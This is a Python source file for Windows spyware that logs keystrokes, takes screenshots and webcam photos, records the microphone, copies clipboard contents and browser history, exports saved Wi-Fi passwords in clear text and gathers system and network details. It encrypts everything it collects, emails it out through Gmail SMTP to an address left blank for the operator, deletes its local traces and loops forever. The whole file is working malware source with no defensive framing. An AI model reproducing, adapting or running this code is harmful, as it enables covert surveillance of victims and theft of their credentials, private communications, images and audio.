# Built-in Modules #
import json
import logging
import pathlib
import os
import re
import shutil
import smtplib
import socket
import subprocess
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import Process

# External Modules #
import cv2
import requests
import sounddevice
import win32clipboard
import browserhistory as bh
from cryptography.fernet import Fernet
from PIL import ImageGrab
from pynput.keyboard import Listener
from scipy.io.wavfile import write as write_rec


# Logs the current key pressed #
def on_press(key): return logging.info(str(key))


'''
########################################################################################################################
Name:       LoggKeys
Purpose:    Detect and log keys pressed by the user.
Parameters: The file path where the logs will be stored.
Returns:    None
########################################################################################################################
'''
def LoggKeys(file_path):
    # Set the log file and format #
    logging.basicConfig(filename=f'{file_path}key_logs.txt', level=logging.DEBUG,
                        format='%(asctime)s: %(message)s')

    # on_press = lambda Key : logging.info(str(Key))

    # Join the keystroke listener thread #
    with Listener(on_press=on_press) as listener:
        listener.join()


'''
########################################################################################################################
Name:       Screenshot
Purpose:    Captured screenshots every five seconds.
Parameters: The file path where the logs will be stored.
Returns:    None
########################################################################################################################
'''
def Screenshot(file_path):
    # Create directory for screenshot storage #
    pathlib.Path('C:/Users/Public/Logs/Screenshots').mkdir(parents=True, exist_ok=True)
    screen_path = f'{file_path}Screenshots\\'

    for x in range(0, 60):
        # Capture screenshot #
        pic = ImageGrab.grab()
        # Save screenshot to file #
        pic.save(f'{screen_path}screenshot{x}.png')
        time.sleep(5)


'''
########################################################################################################################
Name:       Microphone
Purpose:    Actively records microphone in 60 second intervals.
Parameters: The file path where the logs will be stored.
Returns:    None
########################################################################################################################
'''
def Microphone(file_path):
    for x in range(0, 5):
        fs = 44100
        seconds = 60
        my_recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
        sounddevice.wait()
        write_rec(f'{file_path}{x}mic_recording.wav', fs, my_recording)


'''
########################################################################################################################
Name:       Webcam
Purpose:    Captures webcam pictures every five seconds.
Parameters: The file path where the logs will be stored.
Returns:    None
########################################################################################################################
'''
def Webcam(file_path):
    # Create directory for webcam picture storage #
    pathlib.Path('C:/Users/Public/Logs/WebcamPics').mkdir(parents=True, exist_ok=True)
    cam_path = f'{file_path}WebcamPics\\'
    cam = cv2.VideoCapture(0)

    for x in range(0, 60):
        ret, img = cam.read()
        file = f'{cam_path}{x}.jpg'
        cv2.imwrite(file, img)
        time.sleep(5)

    cam.release()
    cv2.destroyAllWindows()


'''
########################################################################################################################
Name:       EmailBase
Purpose:    Format email header and body.
Parameters: The email message and the email address associated with the message.
Returns:    The email message.
########################################################################################################################
'''
def EmailBase(message, email_address):
    message['From'] = email_address
    message['To'] = email_address
    message['Subject'] = 'Success!!!'
    body = 'Mission is completed'
    message.attach(MIMEText(body, 'plain'))
    return message


'''
########################################################################################################################
Name:       SmtpHandler
Purpose:    Facilitates sending the emails with the encrypted data to be exfiltrated.
Parameters: The email address, password, and the email to be sent.
Returns:    None
########################################################################################################################
'''
def SmtpHandler(email_address, password, email):
    try:
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(email_address, password)
        s.sendmail(email_address, email_address, email.as_string())
        s.quit()
    except smtplib.SMTPException:
        pass


'''
########################################################################################################################
Name:       SendMail
Purpose:    Facilitates sending emails in a segmented fashion based on regex matches.
Parameters: The path where the files to emailed are stored.
Returns:    None
########################################################################################################################
'''
def SendMail(path):
    regex = re.compile(r'.+\.xml$')
    regex2 = re.compile(r'.+\.txt$')
    regex3 = re.compile(r'.+\.png$')
    regex4 = re.compile(r'.+\.jpg$')
    regex5 = re.compile(r'.+\.wav$')

    email_address = ''  # <--- Enter your email address
    password = ''  # <--- Enter email password

    msg = MIMEMultipart()
    EmailBase(msg, email_address)

    exclude = {'Screenshots', 'WebcamPics'}
    for dir_path, dir_names, file_names in os.walk(path, topdown=True):
        dir_names[:] = [d for d in dir_names if d not in exclude]
        for file in file_names:
            if regex.match(file) or regex2.match(file) \
                    or regex3.match(file) or regex4.match(file):

                p = MIMEBase('application', "octet-stream")
                with open(path + '\\' + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;'
                                                    'filename = {}'.format(file))
                msg.attach(p)

            elif regex5.match(file):
                msg_alt = MIMEMultipart()
                EmailBase(msg_alt, email_address)
                p = MIMEBase('application', "octet-stream")
                with open(path + '\\' + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;'
                                                    'filename = {}'.format(file))
                msg_alt.attach(p)

                SmtpHandler(email_address, password, msg_alt)

            else:
                pass

    SmtpHandler(email_address, password, msg)


'''
########################################################################################################################
Name:       main
Purpose:    Gathers network information, clipboard contents, browser history, initiates multiprocessing, sends \
            encrypted results, cleans up exfiltrated data, and loops back to the beginning.
Parameters: None
Returns:    None
########################################################################################################################
'''
def main():
    # Create storage for exfiltrated data #
    pathlib.Path('C:/Users/Public/Logs').mkdir(parents=True, exist_ok=True)
    file_path = 'C:\\Users\\Public\\Logs\\'

    with open(file_path + 'network_wifi.txt', 'a') as network_wifi:
        commands = subprocess.Popen(['Netsh', 'WLAN', 'export', 'profile',
                                     'folder=C:\\Users\\Public\\Logs\\', 'key=clear',
                                     '&', 'ipconfig', '/all', '&', 'arp', '-a', '&',
                                     'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a'],
                                    stdout=network_wifi, stderr=network_wifi, shell=True)
        try:
            commands.communicate(timeout=60)

        except subprocess.TimeoutExpired:
            commands.kill()
            commands.communicate()

    # Get the hostname #
    hostname = socket.gethostname()
    # Get the IP address by hostname #
    ip_addr = socket.gethostbyname(hostname)

    with open(file_path + 'system_info.txt', 'a') as system_info:
        try:
            # Query ipify API to retrieve public IP #
            public_ip = requests.get('https://api.ipify.org').text
        except requests.ConnectionError:
            public_ip = '* Ipify connection failed *'
            pass

        # Log the public and private IP address #
        system_info.write(f'Public IP Address: {public_ip}\nPrivate IP Address: {str(ip_addr)}\n')

        get_sysinfo = subprocess.Popen(['systeminfo', '&', 'tasklist', '&', 'sc', 'query'], stdout=system_info,
                                       stderr=system_info, shell=True)
        try:
            get_sysinfo.communicate(timeout=15)

        except subprocess.TimeoutExpired:
            get_sysinfo.kill()
            get_sysinfo.communicate()

    # Copy the clipboard #
    win32clipboard.OpenClipboard()
    pasted_data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()

    with open(f'{file_path}clipboard_info.txt', 'a') as clipboard_info:
        clipboard_info.write('Clipboard Data: \n' + pasted_data)

    # Get the browsing history #
    browser_history = []
    bh_user = bh.get_username()
    db_path = bh.get_database_paths()
    hist = bh.get_browserhistory()
    browser_history.extend((bh_user, db_path, hist))
    with open(file_path + 'browser.txt', 'a') as browser_txt:
        browser_txt.write(json.dumps(browser_history))

    # Create and start processes #
    p1 = Process(target=LoggKeys, args=(file_path,))
    p1.start()
    p2 = Process(target=Screenshot, args=(file_path,))
    p2.start()
    p3 = Process(target=Microphone, args=(file_path,))
    p3.start()
    p4 = Process(target=Webcam, args=(file_path,))
    p4.start()

    # Join processes with 5 minute timeout #
    p1.join(timeout=300)
    p2.join(timeout=300)
    p3.join(timeout=300)
    p4.join(timeout=300)

    # Terminate processes #
    p1.terminate()
    p2.terminate()
    p3.terminate()
    p4.terminate()

    files = ['network_wifi.txt', 'system_info.txt', 'clipboard_info.txt',
             'browser.txt', 'key_logs.txt']

    regex = re.compile(r'.+\.xml$')
    dir_path = 'C:\\Users\\Public\\Logs'

    for _, _, filenames in os.walk(dir_path):
        [files.append(file) for file in filenames if regex.match(file)]

    # In the python console type: from cryptography.fernet import Fernet ; then run the command
    # below to generate a key. This key needs to be added to the key variable below as
    # well as in the DecryptFile.py that should be kept on the exploiters system. If either
    # is forgotten either encrypting or decrypting process will fail. #
    # Command -> Fernet.generate_key()
    key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

    for file in files:
        with open(file_path + file, 'rb') as plain_text:
            data = plain_text.read()

        encrypted = Fernet(key).encrypt(data)

        with open(file_path + 'e_' + file, 'ab') as hidden_data:
            hidden_data.write(encrypted)

        os.remove(file_path + file)

    # Exfiltrate encrypted results via email #
    SendMail('C:\\Users\\Public\\Logs')
    SendMail('C:\\Users\\Public\\Logs\\Screenshots')
    SendMail('C:\\Users\\Public\\Logs\\WebcamPics')

    # Clean Up Files #
    shutil.rmtree('C:\\Users\\Public\\Logs')

    # Loop #
    main()


if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')

    except Exception as ex:
        logging.basicConfig(level=logging.DEBUG, filename='C:/Users/Public/Logs/error_log.txt')
        logging.exception(f'* Error Occurred: {ex} *')
        pass
